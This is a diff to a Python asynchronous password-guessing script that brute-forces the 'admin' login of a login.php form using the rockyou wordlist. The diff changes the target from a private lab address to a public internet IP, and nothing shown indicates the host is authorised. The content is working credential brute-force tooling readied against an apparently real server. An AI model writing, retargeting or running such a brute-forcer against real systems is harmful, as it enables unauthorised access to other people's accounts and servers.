@@ -65,6 +65,7 @@ class PasswordGuesser:
         async with semaphore:
             try:
                 parameters = {"login": self.username, "password": password, "form": self.action_type}
+                # print(parameters)
                 response = await session.post(self.target_url, data=parameters, timeout=aiohttp.ClientTimeout(total=self.timeout))
                 content = await response.text()
                 if 'Invalid credentials or user not activated'.lower() not in content.lower():
@@ -90,9 +91,9 @@ class PasswordGuesser:
 if __name__ == "__main__":
     # Inicializa el PasswordGuesser con los parámetros necesarios y comienza el proceso de adivinanza
     guesser = PasswordGuesser(
-        target_url="http://192.168.138.129:8080/login.php",
+        target_url="http://18.101.238.52:80/login.php",
         username="admin",
-        wordlist_path="/usr/share/wordlists/rockyou.txt",
+        wordlist_path="./rockyou.txt",
         action_type="submit",
         verify_ssl=False
     )
